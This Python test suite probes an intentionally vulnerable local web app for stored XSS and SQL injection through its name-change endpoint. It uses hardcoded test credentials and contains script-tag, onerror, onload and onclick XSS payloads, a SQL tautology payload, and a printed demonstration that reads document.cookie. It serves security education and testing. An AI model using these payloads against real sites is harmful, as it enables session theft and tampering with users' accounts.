#!/usr/bin/env python3
"""
Simple Stored XSS Vulnerability Tests for Vulnerable Web App
This is a lightweight test suite that verifies XSS vulnerabilities without requiring Selenium.
Perfect for quick testing and CI/CD environments.
"""

import requests
import time
import sys
from pathlib import Path

# Configuration
BASE_URL = "http://localhost:5000"
TEST_USERNAME = "Jacksparrow"
TEST_PASSWORD = "princess"

class SimpleXSSTester:
    def __init__(self):
        self.session = requests.Session()
        self.logged_in = False
    
    def login(self):
        """Login to establish a session"""
        print("🔐 Attempting login...")
        
        login_data = {
            'username': TEST_USERNAME,
            'password': TEST_PASSWORD
        }
        
        try:
            # First get the root page (which shows the login form)
            print("   Attempting to get root page...")
            response = self.session.get(f"{BASE_URL}/", timeout=10)
            print(f"   Root page status: {response.status_code}")
            
            if response.status_code != 200:
                print(f"❌ Could not access login page: {response.status_code}")
                return False
                
            # Submit login credentials to /login with POST
            print("   Submitting login credentials...")
            response = self.session.post(f"{BASE_URL}/login", data=login_data, allow_redirects=False, timeout=10)
            print(f"   Login response status: {response.status_code}")
            
            if response.status_code in [302, 303]:
                print(f"✅ Login successful")
                self.logged_in = True
                return True
            else:
                print(f"❌ Login failed: {response.status_code}")
                if response.status_code == 405:
                    print("   Method not allowed - checking if login endpoint exists")
                print(f"   Response content: {response.text[:200]}...")
                return False
                
        except requests.exceptions.ConnectionError:
            print(f"❌ Could not connect to {BASE_URL}")
            print("   Make sure the application is running with: python run.py")
            return False
        except Exception as e:
            print(f"❌ Login error: {e}")
            return False
    
    def get_user_id(self):
        """Get the current user's ID from cookies"""
        for cookie in self.session.cookies:
            if cookie.name == 'userid':
                return cookie.value
        return None
    
    def inject_xss_payload(self, payload, description=""):
        """Inject an XSS payload via the changename endpoint"""
        userid = self.get_user_id()
        if not userid:
            print("❌ Could not find userid cookie")
            return False
        
        change_data = {
            'newname': payload,
            'userid': userid
        }
        
        try:
            response = self.session.get(f"{BASE_URL}/changename", params=change_data)
            
            if response.status_code in [200, 302, 303]:
                print(f"✅ Payload injected: {description}")
                return True
            else:
                print(f"❌ Payload injection failed: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"❌ Payload injection error: {e}")
            return False
    
    def check_payload_storage(self, payload, description=""):
        """Check if the payload is stored and reflected on the profile page"""
        try:
            response = self.session.get(f"{BASE_URL}/profile")
            
            if response.status_code != 200:
                print(f"❌ Could not access profile page: {response.status_code}")
                return False
            
            if payload in response.text:
                print(f"✅ Payload confirmed in profile page: {description}")
                return True
            else:
                print(f"❌ Payload not found in profile page: {description}")
                return False
                
        except Exception as e:
            print(f"❌ Profile page check error: {e}")
            return False
    
    def test_basic_xss(self):
        """Test basic script tag XSS"""
        print("\n🔍 Testing Basic XSS (Script Tag)...")
        
        payload = "<script>alert('XSS_TEST_BASIC')</script>"
        
        if self.inject_xss_payload(payload, "Basic script tag"):
            return self.check_payload_storage(payload, "Basic script tag")
        return False
    
    def test_image_xss(self):
        """Test image tag with onerror XSS"""
        print("\n🔍 Testing Image Tag XSS...")
        
        payload = '<img src="invalid" onerror="alert(\'XSS_IMG\')">'
        
        if self.inject_xss_payload(payload, "Image onerror"):
            return self.check_payload_storage(payload, "Image onerror")
        return False
    
    def test_svg_xss(self):
        """Test SVG with onload XSS"""
        print("\n🔍 Testing SVG XSS...")
        
        payload = '<svg onload="alert(\'XSS_SVG\')">'
        
        if self.inject_xss_payload(payload, "SVG onload"):
            return self.check_payload_storage(payload, "SVG onload")
        return False
    
    def test_div_onclick_xss(self):
        """Test div with onclick XSS"""
        print("\n🔍 Testing DIV onclick XSS...")
        
        payload = '<div onclick="alert(\'XSS_DIV\')" style="cursor:pointer;">Click me for XSS</div>'
        
        if self.inject_xss_payload(payload, "DIV onclick"):
            return self.check_payload_storage(payload, "DIV onclick")
        return False
    
    def test_persistence(self):
        """Test that XSS payload persists across different sessions"""
        print("\n🔍 Testing XSS Payload Persistence...")
        
        # First, inject a timestamped payload
        timestamp = str(int(time.time()))
        payload = f'<script>/* PERSISTENCE_TEST_{timestamp} */alert("PERSISTENT_XSS")</script>'
        
        if not self.inject_xss_payload(payload, "Persistence test"):
            return False
        
        # Create a new session to simulate a different user
        new_session = requests.Session()
        
        # Login with the new session
        login_data = {
            'username': TEST_USERNAME,
            'password': TEST_PASSWORD
        }
        
        try:
            new_session.post(f"{BASE_URL}/login", data=login_data)
            response = new_session.get(f"{BASE_URL}/profile")
            
            if payload in response.text:
                print("✅ XSS payload persists across sessions!")
                return True
            else:
                print("❌ XSS payload does not persist")
                return False
                
        except Exception as e:
            print(f"❌ Persistence test error: {e}")
            return False
    
    def test_sql_injection(self):
        """Test SQL injection in the changename endpoint"""
        print("\n🔍 Testing SQL Injection in changename...")
        
        userid = self.get_user_id()
        if not userid:
            print("❌ Could not find userid cookie")
            return False
        
        # SQL injection payload that should cause an error or unexpected behavior
        sql_payload = "Test' OR '1'='1' --"
        
        change_data = {
            'newname': sql_payload,
            'userid': userid
        }
        
        try:
            response = self.session.get(f"{BASE_URL}/changename", params=change_data)
            
            if response.status_code == 500:
                print("✅ SQL Injection vulnerability confirmed (server error)")
                return True
            elif response.status_code in [200, 302, 303]:
                # Check if the malicious payload was processed
                profile_response = self.session.get(f"{BASE_URL}/profile")
                if sql_payload in profile_response.text:
                    print("✅ SQL Injection vulnerability likely (payload stored)")
                    return True
                else:
                    print("⚠️  SQL query executed but results unclear")
                    return True
            else:
                print(f"❌ Unexpected response: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"✅ SQL Injection vulnerability confirmed (exception: {str(e)})")
            return True
    
    def test_html_injection(self):
        """Test basic HTML injection without JavaScript"""
        print("\n🔍 Testing HTML Injection...")
        
        payload = '<h1 style="color:red;">HTML_INJECTION_TEST</h1>'
        
        if self.inject_xss_payload(payload, "HTML injection"):
            return self.check_payload_storage(payload, "HTML injection")
        return False
    
    def analyze_profile_page(self):
        """Analyze the profile page for XSS vulnerability indicators"""
        print("\n🔍 Analyzing Profile Page for XSS Indicators...")
        
        try:
            response = self.session.get(f"{BASE_URL}/profile")
            
            if response.status_code != 200:
                print(f"❌ Could not access profile page: {response.status_code}")
                return False
            
            # Look for signs that indicate XSS vulnerability
            vulnerability_indicators = [
                ('{{name|safe}}', 'Jinja2 safe filter disables escaping'),
                ('<script>', 'Script tags present in content'),
                ('innerHTML', 'Direct DOM manipulation'),
                ('document.write', 'Unsafe DOM writing')
            ]
            
            found_indicators = []
            for indicator, description in vulnerability_indicators:
                if indicator in response.text:
                    found_indicators.append((indicator, description))
            
            if found_indicators:
                print("✅ XSS vulnerability indicators found:")
                for indicator, description in found_indicators:
                    print(f"   - {indicator}: {description}")
                return True
            else:
                print("❌ No obvious XSS vulnerability indicators found")
                return False
                
        except Exception as e:
            print(f"❌ Profile page analysis error: {e}")
            return False

def print_xss_demo():
    """Print XSS demonstration payloads"""
    print("\n" + "="*60)
    print("🚨 XSS ATTACK DEMONSTRATION PAYLOADS")
    print("="*60)
    print("Use these payloads in the 'Change Name' form to test XSS:")
    print()
    
    payloads = [
        ("<script>alert('Basic XSS')</script>", "Basic alert popup"),
        ('<img src="x" onerror="alert(\'IMG XSS\')">', "Image tag with error handler"),
        ('<svg onload="alert(\'SVG XSS\')">', "SVG with onload event"),
        ('<div onclick="alert(\'Click XSS\')" style="cursor:pointer">Click me</div>', "Clickable div"),
        ("<script>document.body.style.backgroundColor='red'</script>", "Change page background"),
        ("<h1 style='color:red'>HTML Injection</h1>", "Basic HTML injection"),
        ("<script>alert('Cookie: ' + document.cookie)</script>", "Cookie theft demonstration")
    ]
    
    for i, (payload, description) in enumerate(payloads, 1):
        print(f"{i}. {description}:")
        print(f"   {payload}")
        print()

def main():
    print("🚨 Simple Stored XSS Vulnerability Test Suite")
    print("=" * 60)
    print("Testing application for educational XSS vulnerabilities...")
    print(f"Target: {BASE_URL}")
    print()
    
    tester = SimpleXSSTester()
    
    # Test login first
    if not tester.login():
        print("\n❌ Could not establish authenticated session.")
        print("   Make sure the vulnerable app is running on localhost:5000")
        print("   You can start it with: python run.py")
        sys.exit(1)
    
    # Run all tests
    print("\n" + "="*60)
    print("🔍 RUNNING XSS VULNERABILITY TESTS")
    print("="*60)
    
    tests = [
        ("Basic Script Tag XSS", tester.test_basic_xss),
        ("Image Tag XSS", tester.test_image_xss),
        ("SVG Tag XSS", tester.test_svg_xss),
        ("DIV onclick XSS", tester.test_div_onclick_xss),
        ("HTML Injection", tester.test_html_injection),
        ("XSS Payload Persistence", tester.test_persistence),
        ("SQL Injection in changename", tester.test_sql_injection),
        ("Profile Page Analysis", tester.analyze_profile_page)
    ]
    
    results = []
    for test_name, test_func in tests:
        try:
            result = test_func()
            results.append((test_name, result))
        except Exception as e:
            print(f"❌ Test '{test_name}' failed with exception: {e}")
            results.append((test_name, False))
    
    # Print summary
    print("\n" + "="*60)
    print("📊 TEST RESULTS SUMMARY")
    print("="*60)
    
    passed_tests = 0
    for test_name, result in results:
        status = "✅ VULNERABLE" if result else "❌ PROTECTED/FAILED"
        print(f"{test_name:30} : {status}")
        if result:
            passed_tests += 1
    
    print(f"\n🎯 Result: {passed_tests}/{len(results)} vulnerabilities confirmed")
    
    if passed_tests >= len(results) * 0.7:  # 70% success rate
        print("\n✅ SUCCESS: Application demonstrates stored XSS vulnerabilities!")
        print("\n💡 Key Findings:")
        print("   ✓ User input is stored without proper sanitization")
        print("   ✓ Stored content is displayed without HTML escaping")  
        print("   ✓ JavaScript payloads can be injected and stored")
        print("   ✓ XSS payloads persist across different sessions")
        print("\n⚠️  EDUCATIONAL PURPOSE:")
        print("   This application intentionally contains XSS vulnerabilities")
        print("   for educational and testing purposes. In production:")
        print("   - Always sanitize user input")
        print("   - Use proper output encoding/escaping")
        print("   - Implement Content Security Policy (CSP)")
        print("   - Validate all user input on server side")
    else:
        print("\n⚠️  Some tests failed - this could indicate:")
        print("   - Application is not running")
        print("   - Some vulnerabilities might be patched")
        print("   - Network connectivity issues")
    
    # Print demonstration payloads
    print_xss_demo()

if __name__ == "__main__":
    main()
